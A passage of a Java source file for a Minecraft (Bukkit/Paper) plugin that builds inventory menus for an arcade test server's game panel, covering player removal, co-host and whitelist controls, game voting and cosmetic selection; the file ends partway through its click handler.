package au.com.testplex.modern.menu;

import au.com.testplex.modern.model.ArcadeCatalog;
import au.com.testplex.modern.model.CosmeticLineDefinition;
import au.com.testplex.modern.model.CosmeticOption;
import au.com.testplex.modern.model.GameDefinition;
import au.com.testplex.modern.player.PlayerPreferenceStore;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.NamespacedKey;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Set;

/** Simple modern inventory UI. Game-specific renderers are registered alongside each port. */
public final class MenuService implements Listener {
    private static final String PANEL_TITLE = "Game Panel";
    private static final String SET_GAME_TITLE = "Set Game";
    private static final String GAME_OPTIONS_TITLE = "Game Options";
    private static final String REMOVE_PLAYER_TITLE = "Remove Player";
    private static final String UNREMOVE_PLAYER_TITLE = "Un-Remove Player";
    private static final String COHOST_ADD_TITLE = "Give Co-Host";
    private static final String COHOST_REMOVE_TITLE = "Remove Co-Host";
    private static final String WHITELIST_TITLE = "Whitelisted Players";
    private static final String VOTING_TITLE = "Game Voting";
    private static final String CORE_COSMETICS_TITLE = "Cosmetics";
    private static final String COSMETICS_TITLE = "Arcade Cosmetics | Games";
    private static final String GAME_TITLE = "Arcade Cosmetics | Game | ";
    private static final String LINES_TITLE = "Arcade Cosmetics | Feature | ";
    private static final String OPTIONS_TITLE = "Arcade Cosmetics | Setting | ";
    private static final String WINS_TITLE = "Arcade Cosmetics | Win Effects | ";
    private static final String WIN_HOME_TITLE = "Arcade Cosmetics | Win Effects";
    private static final int[] LEGACY_GAME_SLOTS = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};

    private final JavaPlugin plugin;
    private final ArcadeCatalog catalog;
    private final PlayerPreferenceStore preferences;
    private final NamespacedKey actionKey;
    private final NamespacedKey gameKey;
    private final NamespacedKey lineKey;
    private final NamespacedKey optionKey;
    private final NamespacedKey targetKey;

    public MenuService(JavaPlugin plugin, ArcadeCatalog catalog, PlayerPreferenceStore preferences) {
        this.plugin = plugin;
        this.catalog = catalog;
        this.preferences = preferences;
        actionKey = new NamespacedKey(plugin, "menu-action");
        gameKey = new NamespacedKey(plugin, "game-id");
        lineKey = new NamespacedKey(plugin, "line-id");
        optionKey = new NamespacedKey(plugin, "option-id");
        targetKey = new NamespacedKey(plugin, "panel-target");
    }

    /** Legacy Game Panel geometry from Reborn's four-row MenuPage. */
    public void openGamePanel(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 36, PANEL_TITLE);
        inventory.setItem(4, makeItem(Material.BEACON,
                ChatColor.GREEN + "" + ChatColor.BOLD + "Testplex Arcade Game Panel",
                List.of(" ",
                        ChatColor.YELLOW + "Players Online: " + ChatColor.WHITE + Bukkit.getOnlinePlayers().size(),
                        ChatColor.YELLOW + "Players Max: " + ChatColor.WHITE + Bukkit.getMaxPlayers(),
                        ChatColor.GRAY + "Use this panel to select games and maps.")));
        // Slots mirror the host-side 1.8 MenuPage exactly.
        panelButton(inventory, 9, Material.EMERALD_BLOCK, "Start Game", "panel-start");
        panelButton(inventory, 18, Material.REDSTONE_BLOCK, "Stop Game", "panel-stop");
        panelButton(inventory, 15, Material.LAVA_BUCKET, "Remove Player", "panel-remove");
        panelButton(inventory, 11, Material.WRITABLE_BOOK, "Set Game", "panel-set-game");
        panelButton(inventory, 20, Material.BOOK, "Edit Game Rotation", "panel-rotation");
        panelButton(inventory, 17, Material.COMPARATOR, "Game Options", "panel-options");
        panelButton(inventory, 24, Material.WATER_BUCKET, "Un-Remove Player", "panel-unremove");
        panelButton(inventory, 13, Material.DIAMOND_SWORD, "Give Co-Host", "panel-cohost-add");
        panelButton(inventory, 22, Material.GOLDEN_SWORD, "Remove Co-Host", "panel-cohost-remove");
        panelButton(inventory, 26, Material.TNT, "Kill Private Server", "panel-kill-server");
        panelButton(inventory, 30, Material.BOOKSHELF, "Game Voting", "panel-voting");
        panelButton(inventory, 32, Material.PAPER, "Whitelisted Players", "panel-whitelist");
        player.openInventory(inventory);
    }

    private void panelButton(Inventory inventory, int slot, Material material, String label, String action) {
        ItemStack item = makeItem(material, label, List.of(ChatColor.GRAY + "Click to open."));
        mark(item, action, null, null, null);
        inventory.setItem(slot, item);
    }

    private boolean defaultPanelOption(String id) {
        return "public-server".equals(id);
    }

    private void openGameOptions(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, GAME_OPTIONS_TITLE);
        String[] ids = {"public-server", "enforce-whitelist", "force-team-balance",
                "game-auto-start", "game-timeout", "kick-idle-players"};
        String[] labels = {"Public Server", "Enforce Whitelist", "Force Team Balancing",
                "Game Auto Start", "Game Timeout", "Kick Idle Players"};
        Material[] materials = {Material.ENDER_EYE, Material.PAPER, Material.COMPARATOR,
                Material.SLIME_BALL, Material.COMPASS, Material.CLOCK};
        int[] slots = {11, 13, 15, 38, 40, 42};
        for (int i = 0; i < ids.length; i++) {
            boolean enabled = plugin.getConfig().getBoolean("test-options." + ids[i], defaultPanelOption(ids[i]));
            ItemStack item = makeItem(materials[i],
                    (enabled ? ChatColor.GREEN : ChatColor.RED) + labels[i],
                    List.of(enabled ? ChatColor.GREEN + "Enabled" : ChatColor.RED + "Disabled",
                            ChatColor.GRAY + "Click to toggle this isolated test-server option."));
            mark(item, "panel-option-toggle", null, null, ids[i]);
            inventory.setItem(slots[i], item);
            inventory.setItem(slots[i] + 9, makeItem(Material.GRAY_STAINED_GLASS_PANE,
                    (enabled ? ChatColor.GREEN : ChatColor.RED) + labels[i],
                    List.of(enabled ? ChatColor.GREEN + "Enabled" : ChatColor.RED + "Disabled")));
        }
        inventory.setItem(4, backItem("Go Back", "back-panel", null));
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close", List.of()));
        player.openInventory(inventory);
    }

    private void openPlayerList(Player viewer, boolean unremove) {
        String title = unremove ? UNREMOVE_PLAYER_TITLE : REMOVE_PLAYER_TITLE;
        Inventory inventory = Bukkit.createInventory(null, 54, title);
        int slot = 0;
        if (unremove) {
            for (String record : plugin.getConfig().getStringList("panel-blocked-players")) {
                String[] parts = record.split("\\|", 2);
                String uuid = parts[0];
                String name = parts.length > 1 ? parts[1] : uuid;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.YELLOW + name,
                        List.of(ChatColor.GRAY + "Click to restore access."));
                markTarget(item, "panel-unremove-target", uuid, name);
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        } else {
            for (Player target : Bukkit.getOnlinePlayers()) {
                if (target.getUniqueId().equals(viewer.getUniqueId())) continue;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.RED + target.getName(),
                        List.of(ChatColor.GRAY + "Click to remove this player from the test server."));
                markTarget(item, "panel-kick-target", target.getUniqueId().toString(), target.getName());
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        }
        if (slot == 0) inventory.setItem(22, makeItem(Material.BARRIER,
                ChatColor.GRAY + (unremove ? "No removed players" : "No other players online"), List.of()));
        inventory.setItem(49, backItem("Go Back", "back-panel", null));
        playerInventoryOpen(viewer, inventory);
    }

    private void playerInventoryOpen(Player viewer, Inventory inventory) {
        viewer.openInventory(inventory);
    }

    private void markTarget(ItemStack item, String action, String targetUuid, String targetName) {
        ItemMeta meta = item.getItemMeta();
        meta.getPersistentDataContainer().set(actionKey, PersistentDataType.STRING, action);
        meta.getPersistentDataContainer().set(targetKey, PersistentDataType.STRING, targetUuid);
        meta.getPersistentDataContainer().set(optionKey, PersistentDataType.STRING, targetName);
        item.setItemMeta(meta);
    }

    private void openCohostList(Player viewer, boolean remove) {
        Inventory inventory = Bukkit.createInventory(null, 54, remove ? COHOST_REMOVE_TITLE : COHOST_ADD_TITLE);
        int slot = 0;
        if (remove) {
            for (String record : plugin.getConfig().getStringList("panel-cohosts")) {
                String[] parts = record.split("\\|", 2);
                String uuid = parts[0];
                String name = parts.length > 1 ? parts[1] : uuid;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.YELLOW + name,
                        List.of(ChatColor.GRAY + "Click to remove co-host access."));
                markTarget(item, "panel-cohost-remove-target", uuid, name);
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        } else {
            for (Player target : Bukkit.getOnlinePlayers()) {
                if (target.getUniqueId().equals(viewer.getUniqueId())) continue;
                if (isCohost(target.getUniqueId())) continue;
                ItemStack item = makeItem(Material.PLAYER_HEAD, ChatColor.GREEN + target.getName(),
                        List.of(ChatColor.GRAY + "Click to grant co-host controls."));
                markTarget(item, "panel-cohost-add-target", target.getUniqueId().toString(), target.getName());
                inventory.setItem(slot++, item);
                if (slot >= 45) break;
            }
        }
        if (slot == 0) inventory.setItem(22, makeItem(Material.BARRIER,
                ChatColor.GRAY + (remove ? "No co-hosts configured" : "No eligible players online"), List.of()));
        inventory.setItem(49, backItem("Go Back", "back-panel", null));
        viewer.openInventory(inventory);
    }

    private boolean isCohost(java.util.UUID uuid) {
        String prefix = uuid.toString();
        return plugin.getConfig().getStringList("panel-cohosts").stream()
                .anyMatch(record -> record.equals(prefix) || record.startsWith(prefix + "|"));
    }

    private void openWhitelistPage(Player viewer) {
        Inventory inventory = Bukkit.createInventory(null, 54, WHITELIST_TITLE);
        int slot = 0;
        for (Player target : Bukkit.getOnlinePlayers()) {
            boolean whitelisted = target.isWhitelisted();
            ItemStack item = makeItem(Material.PLAYER_HEAD,
                    (whitelisted ? ChatColor.GREEN : ChatColor.RED) + target.getName(),
                    List.of(whitelisted ? ChatColor.GREEN + "Whitelisted" : ChatColor.RED + "Not whitelisted",
                            ChatColor.YELLOW + "Click to toggle the server whitelist entry."));
            markTarget(item, "panel-whitelist-toggle", target.getUniqueId().toString(), target.getName());
            inventory.setItem(slot++, item);
            if (slot >= 45) break;
        }
        inventory.setItem(49, backItem("Go Back", "back-panel", null));
        viewer.openInventory(inventory);
    }

    private void openGameVoting(Player viewer) {
        Inventory inventory = Bukkit.createInventory(null, 54, VOTING_TITLE);
        int[] slots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};
        java.util.Map<String, Integer> votes = new java.util.HashMap<>();
        var storedVotes = plugin.getConfig().getConfigurationSection("game-panel.votes");
        if (storedVotes != null) {
            for (String voter : storedVotes.getKeys(false)) {
                String voted = storedVotes.getString(voter);
                if (voted != null) votes.merge(voted, 1, Integer::sum);
            }
        }
        int index = 0;
        for (GameDefinition game : catalog.getGames()) {
            if (index >= slots.length) break;
            boolean ready = "bacon-brawl".equals(game.getId())
                    && Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern");
            ItemStack item = makeItem(ready ? icon(game.getIcon()) : Material.BARRIER,
                    (ready ? ChatColor.GREEN : ChatColor.RED) + game.getName(),
                    List.of(ChatColor.GRAY + "Votes: " + votes.getOrDefault(game.getId(), 0),
                            ChatColor.YELLOW + (ready ? "Click to vote for the next test." : "Not enabled for 26.3 acceptance yet.")));
            mark(item, "panel-game-vote", game, null, null);
            inventory.setItem(slots[index++], item);
        }
        inventory.setItem(4, backItem("Go Back", "back-panel", null));
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close", List.of()));
        viewer.openInventory(inventory);
    }

    private void onPanelPlayerLogin(PlayerLoginEvent event) {
        String uuid = event.getPlayer().getUniqueId().toString();
        for (String record : plugin.getConfig().getStringList("panel-blocked-players")) {
            if (record.equals(uuid) || record.startsWith(uuid + "|")) {
                event.disallow(PlayerLoginEvent.Result.KICK_BANNED,
                        ChatColor.RED + "You were removed from this Testplex test server.");
                return;
            }
        }
    }



    public void openSetGamePage(Player player) {
        openGameSelection(player, false);
    }

    private void openGameSelection(Player player, boolean rotation) {
        Inventory inventory = Bukkit.createInventory(null, 54, rotation ? "Edit Game Rotation" : SET_GAME_TITLE);
        int[] legacyGameSlots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};
        int index = 0;
        for (GameDefinition game : catalog.getGames()) {
            if (index >= legacyGameSlots.length) break;
            boolean ready = "bacon-brawl".equals(game.getId())
                    && Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern");
            ItemStack item = makeItem(icon(game.getIcon()),
                    (ready ? ChatColor.GREEN : ChatColor.WHITE) + game.getName(),
                    List.of(ChatColor.RESET + ChatColor.GRAY.toString() + "Select this as the next game.",
                            "§1",
                            ChatColor.YELLOW + "Left-Click " + ChatColor.GRAY + (ready
                                    ? "to select this game."
                                    : "to select the lobby game; starting stays gated until parity is cleared."),
                            ChatColor.YELLOW + "Right-Click " + ChatColor.GRAY + "to choose an installed map.",
                            ChatColor.DARK_GRAY + "Port status: " + game.getPortStatus().getDisplay()));
            mark(item, rotation ? "panel-rotation-select" : "panel-game-select", game, null, null);
            inventory.setItem(legacyGameSlots[index++], item);
        }
        inventory.setItem(4, backItem("Go Back", "back-panel", null));
        player.openInventory(inventory);
    }

    /** ArcadeCosmeticsMenu's original 1.8 54-slot game grid and fixed slots. */
    /** Core Cosmetics screen ported from the 1.8 fixed-slot layout. */
    public void openCoreCosmeticsHome(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, CORE_COSMETICS_TITLE);
        String[][] entries = {
                {"1","NETHER_STAR","Particle Effects","Show particles as you walk."},
                {"4","DIAMOND_SWORD","Weapon Names","Rename weapons in supported games."},
                {"7","GOLDEN_HELMET","Hats","Wear hats in supported lobbies."},
                {"10","ARROW","Arrow Effects","Change arrow trails."},
                {"13","CAKE","Win Effects","Choose a per-game win celebration."},
                {"16","DIAMOND_CHESTPLATE","Costumes","Wear a costume in supported lobbies."},
                {"19","SKELETON_SKULL","Death Animations","Choose a death animation."},
                {"21","TORCH","Game Cosmetics","Open per-game Arcade cosmetics."},
                {"22","DIAMOND","Power Play Club Rewards","View local Testplex options."},
                {"23","LEVER","Kit Selector Particles","Choose kit-selection particles."},
                {"25","LEATHER","Morphs","Choose a lobby morph."},
                {"28","GOLDEN_BOOTS","Double Jump Effects","Show double-jump effects."},
                {"31","NAME_TAG","Taunts","Choose taunts for supported games."},
                {"34","BANNER","Flags","Show a country flag in the lobby."},
                {"40","PAPER","Level Colors","Choose a level prefix colour."},
                {"47","LEAD","Balloons","Choose a lobby balloon."},
                {"48","MUSIC_DISC_13","Music","Choose lobby music."},
                {"49","MELON","Gadgets","Use supported lobby gadgets."},
                {"50","IRON_HORSE_ARMOR","Mounts","Choose a lobby mount."},
                {"51","BONE","Pets","Choose a lobby pet."}
        };
        for (String[] entry : entries) {
            ItemStack item = makeItem(icon(entry[1]), ChatColor.RESET + entry[2],
                    List.of(ChatColor.GRAY + entry[3], ChatColor.YELLOW + "Click to open."));
            mark(item, "core-category", null, null, entry[2].toLowerCase(Locale.ROOT).replace(' ', '-'));
            inventory.setItem(Integer.parseInt(entry[0]), item);
        }
        inventory.setItem(46, makeItem(Material.LIGHT_BLUE_STAINED_GLASS_PANE,
                ChatColor.AQUA + "Testplex Arcade Cosmetics",
                List.of(ChatColor.GRAY + "Production Mineplex Core ownership and donation services are not installed.")));
        ItemStack arcade = makeItem(Material.JUKEBOX,
                ChatColor.LIGHT_PURPLE + "" + ChatColor.BOLD + "Arcade Cosmetics",
                List.of(ChatColor.GRAY + "Open the per-game Arcade cosmetic lines.",
                        ChatColor.YELLOW + "Click to browse all Arcade games."));
        mark(arcade, "core-arcade-cosmetics", null, null, null);
        inventory.setItem(52, arcade);
        for (int slot = 0; slot < inventory.getSize(); slot++) {
            if (inventory.getItem(slot) == null) {
                inventory.setItem(slot, makeItem(Material.CYAN_STAINED_GLASS_PANE, ChatColor.DARK_GRAY + " ", List.of()));
            }
        }
        player.openInventory(inventory);
    }

    private void openCoreCosmeticInfo(Player player, String category) {
        Inventory inventory = Bukkit.createInventory(null, 27, "Cosmetics | " + category);
        inventory.setItem(13, makeItem(Material.BARRIER, ChatColor.RED + category + " not installed",
                List.of(ChatColor.GRAY + "The production Mineplex Core gadget/ownership backend",
                        ChatColor.GRAY + "is not part of this isolated Paper 26.3 server.",
                        ChatColor.YELLOW + "Use Arcade Cosmetics for available Testplex options.")));
        inventory.setItem(22, backItem("Back to Cosmetics", "back-core-cosmetics", null));
        player.openInventory(inventory);
    }

    private void openWinEffectsHome(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, WIN_HOME_TITLE);
        int index = 0;
        for (GameDefinition game : catalog.getGames()) {
            if (index >= LEGACY_GAME_SLOTS.length) break;
            ItemStack item = makeItem(icon(game.getIcon()), ChatColor.YELLOW + game.getName(),
                    List.of(ChatColor.GRAY.toString() + game.getWinEffects().size() + " win-effect choices",
                            ChatColor.GREEN + "Click to configure"));
            mark(item, "win-effects-game", game, null, null);
            inventory.setItem(LEGACY_GAME_SLOTS[index++], item);
        }
        inventory.setItem(49, backItem("Back to Cosmetics", "back-core-cosmetics", null));
        player.openInventory(inventory);
    }

    public void openCosmeticsHome(Player player) {
        Inventory inventory = Bukkit.createInventory(null, 54, ChatColor.BLACK + COSMETICS_TITLE);
        int index = 0;
        int[] legacySlots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34, 37, 39, 41, 43};
        for (GameDefinition game : catalog.getGames()) {
            if (index >= legacySlots.length) break;
            ItemStack item = makeItem(icon(game.getIcon()), ChatColor.YELLOW + game.getName(), List.of(
                    ChatColor.GRAY.toString() + game.getCosmeticLines().size()
                            + (game.getCosmeticLines().size() == 1 ? " cosmetic line" : " cosmetic lines"),
                    ChatColor.GRAY + "Win effects are managed separately in Cosmetics.",
                    ChatColor.GREEN + "Click to open"));
            mark(item, "game", game, null, null);
            inventory.setItem(legacySlots[index++], item);
        }
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close",
                List.of(ChatColor.GRAY + "Close the Arcade Cosmetics menu.")));
        player.openInventory(inventory);
    }

    /** Original ArcadeCosmeticsMenu game page: inset feature grid and back/close controls. */
    private void openGameDetails(Player player, GameDefinition game) {
        Inventory inventory = Bukkit.createInventory(null, 54, ChatColor.BLACK + GAME_TITLE + game.getId());
        int[] slots = {10, 12, 14, 16, 19, 21, 23, 25, 28, 30, 32, 34};
        int index = 0;
        for (CosmeticLineDefinition line : game.getCosmeticLines()) {
            if (index >= slots.length) break;
            Set<String> selected = preferences.getSelected(player.getUniqueId(), game, line);
            String equipped = selected.isEmpty() ? "Default" : selected.iterator().next();
            ItemStack item = makeItem(icon(line.getIcon()), ChatColor.YELLOW + line.getTitle(), List.of(
                    ChatColor.GRAY + line.getDescription(),
                    ChatColor.GRAY + (line.getSelectionMode() == CosmeticLineDefinition.SelectionMode.MULTI
                            ? "Enabled toggles: " + selected.size() : "Equipped: " + equipped),
                    ChatColor.GREEN + "Click to view options",
                    ChatColor.DARK_GRAY + "Feature: " + line.getId()));
            mark(item, "cosmetic-line", game, line, null);
            inventory.setItem(slots[index++], item);
        }
        inventory.setItem(45, backItem("Back to Games", "back-arcade-cosmetics", null));
        inventory.setItem(49, makeItem(Material.BARRIER, ChatColor.RED + "Close", List.of()));
        ItemStack winItem = makeItem(Material.FIREWORK_ROCKET, ChatColor.GOLD + "Win Effects",
                List.of(ChatColor.GRAY + "Configure " + game.getName() + " win effect."));
        mark(winItem, "win-effects", game, null, null);
        inventory.setItem(51, winItem);
        player.openInventory(inventory);
    }

    private void openLines(Player player, GameDefinition game) {
        // The source Feature page is represented by the game's cosmetic-line grid.
        openGameDetails(player, game);
    }

    private void openOptions(Player player, GameDefinition game, CosmeticLineDefinition line) {
        Inventory inventory = Bukkit.createInventory(null, 27, OPTIONS_TITLE + game.getId() + " | " + line.getId());
        Set<String> selected = preferences.getSelected(player.getUniqueId(), game, line);
        int slot = 0;
        for (CosmeticOption option : line.getOptions()) {
            String selectionHint = line.getSelectionMode() == CosmeticLineDefinition.SelectionMode.SINGLE
                    ? ChatColor.YELLOW + "Click to equip"
                    : option.getSelectionGroup() == null
                            ? ChatColor.YELLOW + "Click to toggle"
                            : ChatColor.YELLOW + "Click to equip in " + option.getSelectionGroup();
            ItemStack item = makeItem(line.getIcon(),
                    (selected.contains(option.getId()) ? ChatColor.GREEN + "✓ " : ChatColor.WHITE) + option.getName(),
                    List.of(ChatColor.GRAY + option.getDescription(),
                            selected.contains(option.getId()) ? ChatColor.GREEN + "Selected" : ChatColor.GRAY + "Not selected",
                            selectionHint));
            mark(item, "cosmetic-option", game, line, option.getId());
            inventory.setItem(slot++, item);
        }
        inventory.setItem(22, backItem("Back to Cosmetic Lines", "back-lines", game));
        player.openInventory(inventory);
    }

    private void openWinEffects(Player player, GameDefinition game) {
        Inventory inventory = Bukkit.createInventory(null, 27, WINS_TITLE + game.getId());
        int slot = 0;
        String equipped = preferences.getWinEffect(player.getUniqueId(), game);
        for (CosmeticOption option : game.getWinEffects()) {
            ItemStack item = makeItem(Material.FIREWORK_ROCKET,
                    (equipped.equals(option.getId()) ? ChatColor.GREEN + "✓ " : ChatColor.WHITE) + option.getName(),
                    List.of(ChatColor.GRAY + option.getDescription(),
                            equipped.equals(option.getId()) ? ChatColor.GREEN + "Equipped" : ChatColor.YELLOW + "Click to equip"));
            mark(item, "win-option", game, null, option.getId());
            inventory.setItem(slot++, item);
        }
        inventory.setItem(22, backItem("Back to Cosmetic Lines", "back-lines", game));
        player.openInventory(inventory);
    }

    @EventHandler
    public void onBlockedPlayerLogin(PlayerLoginEvent event) {
        onPanelPlayerLogin(event);
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        if (!(event.getWhoClicked() instanceof Player player)) return;
        String title = ChatColor.stripColor(event.getView().getTitle());
        if (title == null || !(title.equals(PANEL_TITLE) || title.equals(SET_GAME_TITLE)
                || title.equals("Edit Game Rotation") || title.equals(GAME_OPTIONS_TITLE)
                || title.equals(REMOVE_PLAYER_TITLE) || title.equals(UNREMOVE_PLAYER_TITLE)
                || title.equals(COHOST_ADD_TITLE) || title.equals(COHOST_REMOVE_TITLE)
                || title.equals(WHITELIST_TITLE) || title.equals(VOTING_TITLE)
                || title.equals(CORE_COSMETICS_TITLE) || title.startsWith("Cosmetics | ")
                || title.startsWith("Arcade Cosmetics |"))) return;
        event.setCancelled(true);
        if (event.getClickedInventory() == null || event.getClickedInventory() != event.getView().getTopInventory()) return;

        ItemStack clicked = event.getCurrentItem();
        if (clicked == null || clicked.getType().isAir() || !clicked.hasItemMeta()) return;
        ItemMeta meta = clicked.getItemMeta();
        String action = meta.getPersistentDataContainer().get(actionKey, PersistentDataType.STRING);
        String gameId = meta.getPersistentDataContainer().get(gameKey, PersistentDataType.STRING);
        String lineId = meta.getPersistentDataContainer().get(lineKey, PersistentDataType.STRING);
        String optionId = meta.getPersistentDataContainer().get(optionKey, PersistentDataType.STRING);
        GameDefinition game = catalog.getGame(gameId);

        if (GAME_OPTIONS_TITLE.equals(title) && "panel-option-toggle".equals(action) && optionId != null) {
            String key = "test-options." + optionId;
            boolean next = !plugin.getConfig().getBoolean(key, defaultPanelOption(optionId));
            plugin.getConfig().set(key, next);
            if ("enforce-whitelist".equals(optionId) && next) plugin.getConfig().set("test-options.public-server", false);
            if ("public-server".equals(optionId) && next) plugin.getConfig().set("test-options.enforce-whitelist", false);
            plugin.saveConfig();
            openGameOptions(player);
            return;
        }
        if (REMOVE_PLAYER_TITLE.equals(title) && "panel-kick-target".equals(action)
                && targetKeyValue(meta) != null && optionId != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            Player target;
            try { target = Bukkit.getPlayer(java.util.UUID.fromString(targetKeyValue(meta))); }
            catch (IllegalArgumentException exception) { return; }
            if (target == null) return;
            List<String> blocked = new ArrayList<>(plugin.getConfig().getStringList("panel-blocked-players"));
            String entry = target.getUniqueId() + "|" + target.getName();
            if (!blocked.contains(entry)) blocked.add(entry);
            plugin.getConfig().set("panel-blocked-players", blocked);
            plugin.saveConfig();
            target.kickPlayer(ChatColor.RED + "You were removed from this Testplex test server.");
            openPlayerList(player, false);
            return;
        }
        if (UNREMOVE_PLAYER_TITLE.equals(title) && "panel-unremove-target".equals(action)
                && targetKeyValue(meta) != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            String uuid = targetKeyValue(meta);
            List<String> blocked = new ArrayList<>(plugin.getConfig().getStringList("panel-blocked-players"));
            blocked.removeIf(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
            plugin.getConfig().set("panel-blocked-players", blocked);
            plugin.saveConfig();
            player.sendMessage(ChatColor.GREEN + "Restored access for " + optionId + ".");
            openPlayerList(player, true);
            return;
        }
        if (COHOST_ADD_TITLE.equals(title) && "panel-cohost-add-target".equals(action)
                && targetKeyValue(meta) != null && optionId != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            List<String> cohosts = new ArrayList<>(plugin.getConfig().getStringList("panel-cohosts"));
            String entry = targetKeyValue(meta) + "|" + optionId;
            if (cohosts.stream().noneMatch(record -> record.equals(targetKeyValue(meta)) || record.startsWith(targetKeyValue(meta) + "|")))
                cohosts.add(entry);
            plugin.getConfig().set("panel-cohosts", cohosts);
            plugin.saveConfig();
            player.sendMessage(ChatColor.GREEN + "Granted local co-host access to " + optionId + ".");
            openCohostList(player, false);
            return;
        }
        if (COHOST_REMOVE_TITLE.equals(title) && "panel-cohost-remove-target".equals(action)
                && targetKeyValue(meta) != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            String uuid = targetKeyValue(meta);
            List<String> cohosts = new ArrayList<>(plugin.getConfig().getStringList("panel-cohosts"));
            cohosts.removeIf(record -> record.equals(uuid) || record.startsWith(uuid + "|"));
            plugin.getConfig().set("panel-cohosts", cohosts);
            plugin.saveConfig();
            openCohostList(player, true);
            return;
        }
        if (WHITELIST_TITLE.equals(title) && "panel-whitelist-toggle".equals(action) && targetKeyValue(meta) != null) {
            if (!isAdmin(player)) { player.sendMessage(ChatColor.RED + "Operator permission required."); return; }
            org.bukkit.OfflinePlayer target;
            try { target = Bukkit.getOfflinePlayer(java.util.UUID.fromString(targetKeyValue(meta))); }
            catch (IllegalArgumentException exception) { return; }
            target.setWhitelisted(!target.isWhitelisted());
            openWhitelistPage(player);
            return;
        }
        if (VOTING_TITLE.equals(title) && "panel-game-vote".equals(action) && game != null) {
            if (!"bacon-brawl".equals(game.getId())
                    || !Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern")) {
                player.sendMessage(ChatColor.RED + "That game is not enabled for 26.3 acceptance.");
            } else {
                plugin.getConfig().set("game-panel.votes." + player.getUniqueId(), game.getId());
                plugin.saveConfig();
                player.sendMessage(ChatColor.GREEN + "Vote recorded for " + game.getName() + ".");
                openGameVoting(player);
            }
            return;
        }

        if (CORE_COSMETICS_TITLE.equals(title)) {
            if ("core-arcade-cosmetics".equals(action)) openCosmeticsHome(player);
            else if ("core-category".equals(action)) {
                if ("game-cosmetics".equals(optionId)) openCosmeticsHome(player);
                else if ("win-effects".equals(optionId)) openWinEffectsHome(player);
                else openCoreCosmeticInfo(player, ChatColor.stripColor(meta.getDisplayName()));
            }
            return;
        }
        if (title.startsWith("Cosmetics | ")) {
            if ("back-core-cosmetics".equals(action)) openCoreCosmeticsHome(player);
            return;
        }
        if (title.equals(COSMETICS_TITLE)) {
            if ("game".equals(action) && game != null) openGameDetails(player, game);
            else if ("Close".equalsIgnoreCase(ChatColor.stripColor(meta.getDisplayName()))) player.closeInventory();
            return;
        }
        if (title.equals(WIN_HOME_TITLE)) {
            if ("win-effects-game".equals(action) && game != null) openWinEffects(player, game);
            else if ("back-core-cosmetics".equals(action)) openCoreCosmeticsHome(player);
            return;
        }
        if (title.startsWith(WIN_HOME_TITLE + " | ")) {
            if ("back-win-home".equals(action)) openWinEffectsHome(player);
            else if ("win-option".equals(action) && game != null && optionId != null) {
                preferences.chooseWinEffect(player.getUniqueId(), game, optionId);
                openWinEffects(player, game);
                player.sendMessage(ChatColor.GREEN + "Saved the " + game.getName() + " win effect.");
            }
            return;
        }
        if (title.startsWith(GAME_TITLE) && "back-arcade-cosmetics".equals(action)) {
            openCosmeticsHome(player);
            return;
        }
        if (title.startsWith(LINES_TITLE) && "back-lines".equals(action)) {
            if (game != null) openGameDetails(player, game);
            return;
        }
        if (SET_GAME_TITLE.equals(title) && "panel-game-select".equals(action)
                && game != null && event.getClick().isRightClick()) {
            plugin.getConfig().set("game-panel.selected-game", game.getId());
            plugin.saveConfig();
            if (!Bukkit.getPluginManager().isPluginEnabled("ArcadeMechanicsModern")) {
                player.sendMessage(ChatColor.RED + "The modern map catalogue is not installed.");
            } else if (!isMechanicsPortGame(game.getId())) {
                player.sendMessage(ChatColor.YELLOW + game.getName()
                        + " uses a dedicated game module; its map selector is not wired into the shared Arcade map menu yet.");
            } else {
                player.closeInventory();
                player.performCommand("arcadeport maps " + game.getId());
            }
            return;
        }
        if (PANEL_TITLE.equals(title)) {
            if ("panel-set-game".equals(action)) openGameSelection(player, false);
            else if ("panel-rotation".equals(action)) openGameSelection(player, true);
            else if ("panel-options".equals(action)) openGameOptions(player);
            else if ("panel-remove".equals(action)) openPlayerList(player, false);
            else if ("panel-unremove".equals(action)) openPlayerList(player, true);
            else if ("panel-cohost-add".equals(action)) openCohostList(player, false);
            else if ("panel-cohost-remove".equals(action)) openCohostList(player, true);
